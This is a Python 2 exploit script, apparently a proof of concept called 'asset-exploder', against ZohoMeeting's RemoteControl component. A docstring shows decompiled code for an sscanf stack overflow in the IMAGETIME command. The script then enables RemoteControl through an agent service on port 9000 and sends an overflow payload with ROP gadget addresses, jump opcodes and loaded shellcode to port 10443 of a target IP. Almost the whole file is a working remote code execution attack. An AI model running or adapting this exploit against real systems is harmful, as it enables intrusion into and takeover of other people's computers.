#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import socket
import ssl
import random
import time

"""
The exploitable RemoteControl function is 'IMAGETIME'
It's a fairly straightforward buffer overflow using sscanf
// cmdbuf = "IMAGETIME X Y"
char __stdcall cmd_IMAGETIME(const char *cmdbuf)
{
  char *copiedstr; // ebx@1
  char str2[20]; // [sp+Ch] [bp-28h]@1
  char str1[20]; // [sp+20h] [bp-14h]@1

  copiedstr = (char *)calloc(1u, strlen(cmdbuf) + 1); // arbitrary sized buffer
  strcpy(copiedstr, cmdbuf);                          // cannot contain nulls
  MemoryMoveLeft(copiedstr, strlen("IMAGETIME "));    // remove cmd prefix
  sscanf(copiedstr, "%s %s", str1, str2);             // into 2x 20 byte fields
  free(copiedstr);                                    
  sub_448B20();
  return sub_447810(str1, str2);
}
"""

def exploit_ZohoMeeting(sock, handle, extra):
    """
ZohoMeeting.exe, v1.0.0.85?
MD5: 08B6393A861D0DBB289675C9E777C39F
SHA1: B073384A0F488CAAA909F4F100C281CC28915122
    """
    fh = sock.makefile()
    while True:
        line = fh.readline().strip().split()
        if not line:
            break
        if line[0] == "RES":
            print("[+] Connection ready")
            shellcmdlen = len('AnAmAoApAqArAsAtAuAvAwAxAyAzANAMAOAPAQAR') - 1
            shellcmd = ''.join([chr(x) for x in [
                0x90,           # nop
                0x90,           # nop
                0x8b,0x04,0x24, # mov eax, [esp]
                0x83,0xc0,0x4D, # add eax, byte +0x4D
                0xff,0xe0       # jmp eax
            ]])
            shellcmd = shellcmd + ('X' * (shellcmdlen - len(shellcmd)))
            ROPCODE1 = chr(0x8D) + chr(0x04) + chr(0x48) # 0x0048048d: jmp ecx ;  (1 found)
            ROPCODE2 = chr(0x09) + chr(0x89) + chr(0x44) # XXX: left-over from previous ZohoMeeting sploit
            shellcode = handle.read()
            exploit = 'IMAGETIME A1A2A3A4A5A6A7A8A9A0' + ROPCODE1 + ' ' + shellcmd + ROPCODE2 + " " + shellcode + extra + "\n"
            fh.write(exploit)
            fh.flush()
            print("[+] Send payload")
            break
    print("[*] Success")
    sock.close()

def connect(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
    except Exception:
        return None
    return sock

def aeagent_cmd(ip, port, cmd):
    try:
        aeagent_sock = connect(ip,  port)
        if not aeagent_sock:
            print("[!] Failed to connect to", ip, port)
            return None
        aeagent_ssl = ssl.wrap_socket(aeagent_sock, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE)
    except Exception as ex:
        print(ex)
        print("[!] Failed to setup SSL socket")
        return None
    try:
        aeagent_ssl.send("derp#bala#" + cmd + "#derp\n")
        return aeagent_ssl.read()
    except Exception:
        print("[!] Failed to send aeagent command", cmd, "to", ip, port)

def enable_RemoteControl(ip):
    port = 9000
    print("[-] Connecting to", ip, "port", port)
    result = aeagent_cmd(ip, port, "STOPRDS")
    if result == 'success':
        print("[-] RemoteControl was running")
    else:
        print("[-] RemoteControl was not running")
    print("[-] Enabling RemoteControl via aeagent.exe");
    result = aeagent_cmd(ip, port, "RDS")
    if result != 'success':        
        return False
    print("[-] Enabled, waiting for RemoteControl connection")
    return True

def print_logo():
    clear = "\x1b[0m"
    colors = [31, 32, 33, 34, 35, 36]
    logo = u"""
 ▄▄▄        ██████   ██████  ██▓███   ██▓     ▒█████  ▓█████▄ ▓█████  ██▀███  
▒████▄    ▒██    ▒ ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒░██   █▌▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██   ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
 ▓█   ▓██▒▒██████▒▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░▒████▓ ░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
  ░   ▒   ░  ░  ░  ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ░ ░  ░    ░     ░░   ░ 
      ░  ░      ░        ░               ░  ░    ░ ░     ░       ░  ░   ░     
                                                       ░                      
"""
    for line in logo.split("\n"):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

def main(args):
    if len(args) < 2:
        print("Usage: asset-exploder.py <ip> [payload] [extra]\n")
        return
    else:
        ip = args[1]
    if len(args) > 2:
        handle = open(args[2], "rb")
    else:
        handle = open('shellcode/payload-ShellExecuteA.bin', "rb")
    if len(args) > 3:
        extra = args[3]
    else:
        extra = 'calc'
    print_logo()
    if not enable_RemoteControl(ip):
        print("[!] Unable to start RemoteControl...")
        return
    conn_sleep = 0.2
    conn_n = 5 / conn_sleep
    zosock = None
    while conn_n > 0:
        try:
            zosock = connect(ip, 10443)
            if zosock:
                print("[+] Connected to RemoteControl")
                break
        except Exception:
            print("[!] Cannot connect to RemoteControl")
            return
        time.sleep(conn_sleep)
    if not zosock:
        return
    exploit_ZohoMeeting(zosock, handle, extra)

if __name__ == "__main__":
    main(sys.argv)
